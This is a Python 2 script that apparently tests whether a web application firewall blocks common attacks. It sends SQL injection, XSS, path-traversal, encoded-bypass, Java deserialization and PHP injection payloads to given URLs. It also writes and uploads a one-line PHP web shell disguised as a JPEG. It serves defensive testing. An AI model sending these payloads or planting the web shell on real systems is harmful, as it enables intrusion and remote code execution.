#!/bin/python
import requests
import sys
import os
#from requests.exceptions import ConnectionError
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
## disable https certificate warning




#import optparse
#import requests
#from requests.packages.urllib3.exceptions import InsecureRequestWarning

#requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#site_list=['http://222.73.204.250']
#site_list=['http://127.0.0.1:8080']
site_list=[]
# GET 0
# POST 1
# HEAD 2
# OPTION 3
# PUT 4
# DELETE 5
# ....


# ==========
# [TODO]
#  get payload from file
#  multi-threads
#  [DONE] exception handler
#  turn %25 back to %
#  purify paralized query eg. files
#  clean file storage
#  with parser!
# ==========


class Attacks:
    def __init__(self, verb, url, para, head, file, status, name):
        self.verb = verb
        self.url = url
        self.para = para
        self.head = head
        self.file = file
        self.status = status
        self.name = name

attack_list=[]

attack_list.append(Attacks(0,'/?id=1 and 1 = 2',None,None,None,403,'plain SQL injection'))
# sql injection in url

attack_list.append(Attacks(0,'/?title=<script>alert(1)<script>',None,None,None,403,'plain XSS'))
# xss in url

attack_list.append(Attacks(1,'/',{'something':'rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGF\
uZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphd\
mEudXRpbC5NYXB4cgBzL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbW1vcGFjaGUuY29tbW9ucy5jb2x\
sZWN0aU92ZXJyaWRlcm94eeEn2mF0aW9uLkFubm90YXRpb25Jbn1pY3QuYW5ub3RhdGlvbi7LAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY\
2F0aW9uSGFuZGxlcjt4cHNxAH4AAHNyACouUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3J\
zLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL\
1N0cmQwZDhjNTZlM2I4M2FmODdkNDVkN3QABGV4ZWN1cQB+AB4AAAABcQB+ACNzcQB+ABFzcgARamF2YS51dGlsLkhhc2hTZXS6RIWVlri3NAMAAHhwdww\
AAAAAP0AAAAAAAAB4c3IAEWphdmEudXRpbC5IYXNoTWFwBQdpb25zLlRyYW5zZm9ybWVyO71WKvHYNGN6b3lNRG9pQUZOMVoyRnlWR2hsYldVQVgycHpRM\
kZqYQFwAAAAAHQACWdldE1ldGhvZHVxAGN0L0ludm91bi5yZWZsZWN0LmFubm90YXRpb24uQW5ub3RhdGlvbkludm9jAAABAA1qYXZhLnV0aWwuTWFweHI\
AF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hhdmF4L21hb\
mFnZW1ldLpEhZWWuLc0cnZlc2hvbGR4cD9AAAAAAAAQdwgAAAAQAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN\
0b3JzLkludm9rZTpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZgAsTG9yZy9hcHMvVHJhbnNmcHhyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94e\
eEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNxAH4AAHNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29\
sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO\
3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1\
lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuvVYq8dg0GJlwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAGUAAC5mdW5jdG9yc\
y5JbnZva2VyVHJhbnNmb3N0AA9MamF2YS91dGlsL01hcDtML2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmN\
vbGxlY3Rpb25zLlRyAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB4cAAAAAJ0BX1pbXBvcnQgamF2YS5pby5GaWxlT3V0cHV0U3RyZ\
WFtOyBpbXBvcnQgc3VuLm1pc2MuQkFTRTY0RGVjb2RlcjsgYwAAAQANamFsZHhwP0AAOQ=='},None,None,403,'JAVA deserialization'))
# java deserialization

attack_list.append(Attacks(1,'/',None,None,{'upload_file': open('s.rar.php.rar','rb')},403,'Multi suffix file upload'))
# file upload

attack_list.append(Attacks(0,'/?f=../../../../../etc/passwd'+'\x00'+'.img',None,None,None,403,'hex 00 and LFI'))
# hex 00 and LFI # DO NOT USE ARG 'url'

attack_list.append(Attacks(0,'/?cmd=<?php phpinfo(); ?>',None,None,None,403,'php syntax injection'))
# php command injection

attack_list.append(Attacks(0,'/',{'id':'1+UnIoN/**/SeLecT/**/1,2,3'},None,None,403,'SQL injection with simple bypass'))
# sql injection in url 2

attack_list.append(Attacks(0,'/',{'title':'onerror=a=alert;a=()'},None,None,403,'XSS with simple bypass'))
# xss in url 2

attack_list.append(Attacks(1,'/somewhereyoucanupload',None,{'Content-Type':'image/jpeg'},{'upload_file': open('s.jpg','rb')},403,'fake file'))
# file upload 2

attack_list.append(Attacks(0,'/?f=../../../../../etc/test/../passwd',None,None,None,403,'LFI'))
# LFI # DO NOT USE ARG 'url'

attack_list.append(Attacks(0,'/?z0=OTcyMTI1O0Bpbmlfc2V0KCJkaXNwbGF5X2Vycm9ycyIsIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7QHNldF9\
tYWdpY19xdW90ZXNfcnVudGltZSgwKTtlY2hvKCItPnwiKTs7ZWNobyBAZndyaXRlKGZvcGVuKGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKSwidyIpL\
GJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MiJdKSk/IjEiOiIwIjtlY2hvKCJ8PC0iKTs7ZGllKCk7&z1=L2RhdGEvd3d3cm9vdC91LnpwLmNoaW5hLmNvbS5\
jbi9kc2ZyLzIwMTYwODE0MTI4MDguaHRtbA==',None,None,None,403,'PHP syntax injection with simple bypass'))
# php command injection 2

attack_list.append(Attacks(0,'/?aWQ9MSBhbmQgaWQ9Mg==',None,None,None,403,'Base64 decoding'))
# base64 decode

attack_list.append(Attacks(0,'/?id%3D1%20and%201%3D2',None,None,None,403,'URL decoding'))
# url decode

attack_list.append(Attacks(0,'/?value=%26%23x3C%3Ba%20href%3D%26%23x27%3B%20%26%2314%3B%20javascript%3Aalert%281%29%20\
%26%23x27%3B%20%2f%26%23x3E%3B',None,None,None,403,'HTML entities decoding'))
# html entities decode

attack_list.append(Attacks(0,'/?value=0x3c7363726970743e616c657274282f7873732f293c2f7363726970743e',None,None,None,403,'HEX decoding'))
# hex decode

attack_list.append(Attacks(0,'/?%u0073%u0065%u006c%u0065%u0063%u0074 1 from t%23',None,{'Content-Type':'application/x-www-form-urlencoded'},None,403,'UNICODE decoding'))
# unicode decode

attack_list.append(Attacks(0,'/?<script>eval(/u0061/u006c/u0065/u0072/u0074(1))</script>',None,None,None,403,'eval with coding'))
#  decode

attack_list.append(Attacks(0,'/?p=JiN4M0M7YSBocmVmPSYjeDI3OyBcdCBqYXZhc2NyaXB0OmFsZXJ0KDEpICYjeDI3OyAvJiN4M0U7',None,None,None,403,'multi layer decoding'))
# multi layer decode

attack_list.append(Attacks(0,'/?q=select the best union students from class',None,None,None,200,'false positive testing 1'))
# false positive test: sql injection

attack_list.append(Attacks(0,'/?q=javascript should be located within <script></script> tags',None,None,None,200,'false positive testing 2'))
# false positive test: xss

attack_list.append(Attacks(0,'/',None,{'User-Agent':'SQLMAP v1.1'},None,403,'Crawler'))
# crawler
def main():
    print
    print
    print '###########################'#
    print '#   Crappy Waf Validator  #'
    print '#   someone@somesite.com  #'
    print '#       v 0.1 alpha       #'
    print '###########################'
    print
    print
    if len(sys.argv) == 1:
        print_usage()
        # print '[INFO] Usage: python wafscan.py http://www.target.com:8000'
        sys.exit()
    for i in sys.argv[1:]:
        if not i.startswith('http'):
            i = 'http://' + i
                # let it start with protocol
        j=i
                # get rid of slashes
        while j[-1:] == '/':    # ends with slash
            j=j[0:-2]
        site_list.append(j)
    create_file()

def get_dispatcher(tgt,atk):
    #try:
    r = requests.get(tgt + atk.url, params=atk.para, headers=atk.head, timeout=2,verify=False)
    #except requests.exceptions.ConnectionError, e:
    #    print e
    #print r.text

    is_waf_nailed(r,atk)

def post_dispatcher(tgt,atk):
    r = requests.post(tgt + atk.url,data=atk.para,headers=atk.head,files=atk.file, timeout=2,verify=False)
    is_waf_nailed(r,atk)

def is_waf_nailed(r,atk):
    if r.status_code==atk.status:
        print '[+] '+ atk.name + ' attack intercepted! with status code: ' + str(r.status_code)
    else:
        print '[+] R.I.P. my lil WAF, died with HTTP ' + str(r.status_code)

def print_usage():
    print
    print '[INFO] Usage: python wafscan.py http://www.target.com:8000 http://hostname.domain:9000 ...'
    print '[INFO] Have fun!'
    print

def create_file():
    try:
        with open('s.rar.php.rar', 'w+') as f:
            f.write("something here")
    except Exception, e:
        print e
    try:
        with open('s.jpg', 'w+') as f:
            f.write("<?php ($_=@$_GET[2]).@$_($_POST[1])?>")
    except Exception, e:
        print e

def clear_file():
    #try:
    #    os.remove("s.rar.php.rar")
    #    os.remove("s.jpg")
    #except:
    #    print 'Maid job failed, remove files ur self.'
    pass



main()
for i in site_list:
    for j in attack_list:
        try:
            if j.verb==0:
                # should be switch in case of over 2 http verbs
            #try:
                get_dispatcher(i,j)
                # cluster bomber
            #except requests.exceptions.ConnectionError, e:
                #print e
                #print str(e).split(':')[-1][1:-4]
                #sys.exit()

            else:
            #try:
                post_dispatcher(i,j)
            #except Exception, e:
                #print '[Error]', e
                #print_usage()
                #sys.exit()
        except requests.ConnectionError:
            print '[Error] Connection Error'
            sys.exit()
        except requests.Timeout:
            print '[Error] Time Out'
            sys.exit()
            #if 'y'==raw_input('Retry? (y/n)').lower():
            #    main()
        #except (requests.exceptions.RequestsWarning,requests.exceptions.SSLError) as e:
        #    pass
        except requests.RequestException,e:
            if ''==raw_input('[Error] FATAL: press <enter> to see full error message'):
                print e
                sys.exit()
            sys.exit()
clear_file()